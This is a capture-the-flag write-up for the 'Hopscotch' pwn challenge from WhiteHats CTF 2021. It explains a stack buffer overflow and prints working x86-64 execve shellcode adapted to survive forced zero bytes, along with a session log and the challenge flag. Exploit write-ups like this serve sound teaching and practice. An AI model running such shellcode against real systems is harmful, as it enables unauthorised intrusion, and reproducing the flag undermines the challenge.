---
layout: writeup
ctf: WhiteHats CTF 2021
chal: Hopscotch
category: pwn 
flag: WH2021{8a11f6615742a_h0p_st3p_jUMp_Dr3w_Dr@w_dr@wN}
points: 991
solves: 5
---

> One childhood pasttime I never got to experience much is Hopscotch, a game where you jump and hop over boxes to reach to the goal.

> Won't you play with me?

Files given:
 - [hopscotch](hopscotch)

This challenge is a simple shellcoding exercise.

## Challenge details

There is no canery and NX bit is not set, furthermore the address to our input is printed, hence it we need to give it a proper shellcode to run.

We have a 48 byte array that we can write 96 bytes to, allowing us to overflow the return pointer. However, there is a variable right after the array acting as a 'canery' and is checked against 1337, so we will have to take care of that when overflowing.

The difficulty lies in the fact that when we input our payload, the `9,21,33,45`th bytes are set to `0`, hence we need a shellcode that has those as well.

There are 2 immediate ideas that comes to mind, a very short jump or moving 0 to a register. We can try out these in [shell-storm](http://shell-storm.org/online/Online-Assembler-and-Disassembler/) and prepare our shellcode there. For instance the following are viable options to use when needing a 0:
 - `b"\xb0\x00", # mov al,0`
 - `b"\xb4\x00", # mov ah,0`
 - `b"\xb8\x00\x00\x00\x00", # mov eax,0`
 - `b"\xeb\x00", # jmp 2`
note that the `jmp 2` acts as a `nop` as it is `2` bytes long. Using these in mind, I simply inserted these whenever appropriate to get
```
0x00: 31 C0                          xor     eax, eax
0x02: 48 C7 C0 00 00 00 00           mov     rax, 0
0x09: 48 BB D1 9D 96 91 D0 8C 97 FF  movabs  rbx, 0xff978cd091969dd1
0x13: B0 00                          mov     al, 0
0x15: 48 F7 DB                       neg     rbx
0x18: 53                             push    rbx
0x19: 54                             push    rsp
0x1a: 5F                             pop     rdi
0x1b: 99                             cdq     
0x1c: 52                             push    rdx
0x1d: 57                             push    rdi
0x1e: 54                             push    rsp
0x1f: B0 00                          mov     al, 0
0x21: 5E                             pop     rsi
0x22: B0 3B                          mov     al, 0x3b
0x24: 0F 05                          syscall 
```

Using this we get shell and a with one very lazy grep command, we obtained the flag!

```
ariana@ariana ~/D/S/2/W/Hopscotch> py exploit.py remote
[+] Opening connection to chals.whitehacks.ctf.sg on port 20401: Done
[*] Switching to interactive mode
Enter input: $ grep -rnw "WH2021" / 2>/dev/null
/home/hopscotch/flag.txt:1:WH2021{8a11f6615742a_h0p_st3p_jUMp_Dr3w_Dr@w_dr@wN}
```

The solution script can be found at [exploit.py](exploit.py)
